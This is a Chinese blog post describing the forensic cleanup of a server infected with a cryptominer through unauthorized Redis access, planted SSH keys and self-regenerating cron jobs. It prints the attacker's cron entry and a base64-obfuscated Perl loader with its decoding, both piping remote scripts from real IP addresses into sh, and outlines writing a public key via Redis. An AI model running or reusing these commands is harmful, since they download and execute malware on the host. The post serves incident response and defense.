title: 由Redis未授权访问引起的一次入侵
tags: ['服务器相关']
date: 2017-04-05 16:51:33


> 实习期间遇到的一次入侵，服务器被人种了挖矿马，经过排查，发现是Redis未授权访问写入的ssh，加之crontab定时任务

首先使用history命令查看历史操作，大概理清遇到了什么问题。

发现安装杀毒软件并且多次杀掉进程，并且删除/var/spool/cron/root操作出现多次并且还删除了同目录下的crontabs文件夹，初步推测该root文件可再生。

并且发现了AnXqv及wnTKYg挖矿程序，初步推测是挖矿程序的问题，top命令发现有名为apache进程占用CPU率接近100%，验证猜测。

根据历史操作，进入/var/spool/cron文件下，发现crontabs文件夹及root文件再生了，首先查看crontabs文件夹，里面也是一份名为root的文件，内容为：

*/5 * * * * curl -fsSL http://103.216.121.231:9999/i.sh?8 | sh/root/minerd 19999

通过百度，发现minerd是挖矿程序。

查看root文件，里面运行了根目录下一个文件，返回根目录ls-al查看所有文件，发现除了root文件指向的文件之外，还有数份类似命名规则的文件，如图:

![](http://www.meizj.com.cn/wp-content/uploads/2017/04/QQ图片20170403171414-300x190.png)

经过查看后发现，根据内容将这些文件分为两类，一类是：

```shell
use

MIME::Base64;eval(decode_base64('IyEvdXNyL2Jpbi9wZXJsDQogICAgIC

AgICBzeXN0ZW0oIlx4NzdceDY3XHg2NVx4NzRceDIwXHgyRFx4NzFceDR

GXHgyMFx4MkRceDIwXHg2OFx4NzRceDc0XHg3MFx4M0FceDJGXHgyR

lx4MzZceDM1XHgyRVx4MzJceDM1XHgzNFx4MkVceDM2XHgzM1x4MkVc

eDMyMFx4MkZceDYxXHgyMFx4N0NceDIwXHg3M1x4NjhceDIwXHgzQlx4

MjBceDYzXHg3NVx4NzJceDZDXHgyMFx4MkRceDRGXHgyMFx4NjhceDc0

XHg3NFx4NzBceDNBXHgyRlx4MkZceDM2XHgzNVx4MkVceDMyXHgzNV

x4MzRceDJFXHgzNlx4MzNceDJFXHgzMjBceDJGXHg2MVx4MjBceDNCX

HgyMFx4NzNceDY4XHgyMFx4NjFceDIwXHgzQlx4MjBceDcyXHg2RFx4M

jBceDJEXHg3Mlx4NjZceDIwXHg2MSIpOw=='));

```

经过解码后就是：

```shell
use MIME::Base64;eval (decode_base64（#!/usr/bin/perl

system("wget -qO - http://65.254.63.20/a | sh ; curl -O http://65.254.63.20/a ; sh a ; rm -rf a");）);
```

另一类是：

```shell 
#!/usr/bin/perl .d41d8cd98f00b204e9800998ecf8427e
```

&nbsp;

大概判断是从某网址下载文件，运行文件，然后再删除

首先删除/var/spool/cron/root文件及/var/spool/cron/crontabs文件夹及/root/minerd文件，观察是否再生。

经过等待，除了/var/spool/cron/root之外的文件都未再生。

反过头通过百度anxqv的消息，发现有可能是攻击者利用redis未授权访问的漏洞进行了攻击，查看/root/.ssh文件夹，发现一个陌生公钥，通过排除，确定非本地人员，删除该公钥，并且本地搭建redis，对服务器进行授权访问测试，发现可以直接写入自己的公钥到服务器/root/.ssh目录下，连接成功，并且可以上传文件，将redis的6379端口不接入外网，修复漏洞。

几天后，查看.ssh文件夹，并未重新生成公钥，确认redis漏洞修复。

Kill apache进程，删除根目录下如图中的文件

crontab –l 命令查看，发现没有定时程序了。

开始分析. d41d8cd98f00b204e9800998ecf8427e文件，将其中执行的第一个命令输出到控制台：

经过阅读，大概有这么几个可疑的地方，一是/etc/cron.daily/anacron文件，查看文件，发现该文件与有几个可疑点。

1.

![](http://www.meizj.com.cn/wp-content/uploads/2017/04/2-300x20.png)

图中高亮的代码是. d41d8cd98f00b204e9800998ecf8427e文件中的内容，推测. d41d8cd98f00b204e9800998ecf8427e文件由该文件生成。

2.紧接上图高亮代码的下一句，文件名MD5加密。

3.

![](http://www.meizj.com.cn/wp-content/uploads/2017/04/3-300x46.png)

从图中可知，将之前删除掉的root文件再生的源头就是anacron文件，继续向下阅读。

4.在接下来的代码中，多次启动名为apache的程序，与top命令查看结果一致，至此，基本确定anncron文件就是不断生成cron下root文件，以及重复执行根目录下. d41d8cd98f00b204e9800998ecf8427e文件的源头。

删除anacron文件，观察发现apache不再启动，补上redis的漏洞，修复完成。

总结：大概流程是，攻击者利用redis漏洞，免密码ssh连接，然后下载文件，并将该文件保存为anacron文件，后面的定时也是从该文件衍生，挖矿程序至apache后不再更名的原因可能是，，攻击者无法ssh连接，只能运行最后一次下载的文件，之前删除的都是衍生物，并未删除根源，所以会重生，删除根源文件即可。

